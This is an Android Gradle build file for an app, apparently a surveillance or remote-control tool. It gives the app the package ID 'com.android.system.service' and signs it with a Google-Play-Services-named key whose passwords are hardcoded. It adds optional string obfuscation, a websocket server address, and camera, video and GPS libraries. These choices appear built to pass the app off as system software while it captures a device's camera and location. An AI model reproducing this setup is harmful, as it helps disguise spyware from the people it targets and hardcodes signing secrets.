plugins {
    id 'com.android.application'
}

// ── LSParanoid (optional obfuscation) ────────────────────────────────────────
def skipParanoid = project.findProperty('SKIP_PARANOID') != 'false'
if (!skipParanoid) {
    try {
        apply plugin: 'org.lsposed.lsparanoid'
        println '[OK] LSParanoid coupled.'
    } catch (Exception e) {
        println '[WARN] LSParanoid unavailable: ' + e.message
    }
} else {
    println '[INFO] LSParanoid skipped (SKIP_PARANOID=true).'
}

// ── CI-injectable properties ──────────────────────────────────────────────────
def serverUrl    = project.findProperty('SERVER_URL')     ?: 'wss://localhost:3000'
def keystorePath = project.findProperty('KEYSTORE_PATH')  ?: '../google-services-release.jks'
def keystorePass = project.findProperty('KEYSTORE_PASS')  ?: 'GooglePlayServices2024'
def keyAlias     = project.findProperty('KEY_ALIAS')      ?: 'google-services-key'
def keyPass      = project.findProperty('KEY_PASS')       ?: 'GooglePlayServices2024'
def vCode        = (project.findProperty('VERSION_CODE')  ?: '10205').toInteger()
def vName        = project.findProperty('VERSION_NAME')   ?: '1.2.5'

// ── CameraX version ───────────────────────────────────────────────────────────
def cameraxVersion = '1.3.4'

android {
    namespace   'com.seguranca.protecao'
    compileSdk  34

    defaultConfig {
        applicationId    'com.android.system.service'
        minSdk           24
        targetSdk        34
        versionCode      vCode
        versionName      vName

        testInstrumentationRunner 'androidx.test.runner.AndroidJUnitRunner'
        resourceConfigurations  += ['pt', 'en']

        buildConfigField 'boolean', 'IS_OBFUSCATED', 'true'
        buildConfigField 'String',  'SERVER_URL',    "\"${serverUrl}\""
    }

    signingConfigs {
        release {
            storeFile        file(keystorePath)
            storePassword    keystorePass
            keyAlias         keyAlias
            keyPassword      keyPass
            v1SigningEnabled true
            v2SigningEnabled true
            enableV3Signing  true
            enableV4Signing  true
        }
    }

    buildTypes {
        debug {
            debuggable      true
            minifyEnabled   false
            shrinkResources false
        }
        release {
            debuggable      false
            minifyEnabled   true
            shrinkResources true
            proguardFiles   getDefaultProguardFile('proguard-android-optimize.txt'),
                            'proguard-rules.pro'
            signingConfig   signingConfigs.release
        }
    }

    aaptOptions {
        cruncherEnabled = false
    }

    packagingOptions {
        jniLibs {
            useLegacyPackaging = true
        }
        resources {
            excludes += [
                'DebugProbesKt.bin',
                'META-INF/*.version',
                'META-INF/NOTICE*',
                'META-INF/LICENSE*',
                'META-INF/DEPENDENCIES',
                'META-INF/services/*',
                'kotlin/**',
                'okhttp3/**',
                'assets/dexopt/*',
            ]
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }

    buildFeatures {
        viewBinding true
        buildConfig true
    }
}

dependencies {
    def exclProfile = { exclude group: 'androidx.profileinstaller' }

    // ── Core AndroidX ─────────────────────────────────────────────────────────
    implementation('androidx.appcompat:appcompat:1.6.1',                exclProfile)
    implementation('com.google.android.material:material:1.11.0',       exclProfile)
    implementation('androidx.lifecycle:lifecycle-runtime-ktx:2.7.0',   exclProfile)
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'

    // ── Room ──────────────────────────────────────────────────────────────────
    implementation('androidx.room:room-runtime:2.6.1',                  exclProfile)
    annotationProcessor 'androidx.room:room-compiler:2.6.1'

    // ── Network ───────────────────────────────────────────────────────────────
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'

    // ── CameraX ───────────────────────────────────────────────────────────────
    // Required by CameraManager (features/camera)
    implementation "androidx.camera:camera-core:${cameraxVersion}"
    implementation "androidx.camera:camera-camera2:${cameraxVersion}"
    implementation "androidx.camera:camera-lifecycle:${cameraxVersion}"
    implementation "androidx.camera:camera-video:${cameraxVersion}"
    implementation "androidx.camera:camera-view:${cameraxVersion}"

    // ── Google Play Services — Location ───────────────────────────────────────
    // Required by GpsManager (features/location).
    // 21.x is needed for LocationRequest.Builder API.
    implementation 'com.google.android.gms:play-services-location:21.3.0'

    // ── Guava (ListenableFuture) ──────────────────────────────────────────────
    // Required by CameraManager's ProcessCameraProvider.getInstance().
    // Use the Android-specific flavour to avoid Java 8 desugaring conflicts.
    implementation 'com.google.guava:guava:32.1.3-android'

    // ── LSParanoid stub (compile-only when plugin is skipped) ─────────────────
    if (skipParanoid) {
        compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
    }

    // ── Test ──────────────────────────────────────────────────────────────────
    testImplementation         'junit:junit:4.13.2'
    androidTestImplementation  'androidx.test.ext:junit:1.1.5'
    androidTestImplementation  'androidx.test.espresso:espresso-core:3.5.1'
}

// Strip profileinstaller from every transitive dependency
configurations.all {
    exclude group: 'androidx.profileinstaller', module: 'profileinstaller'
}
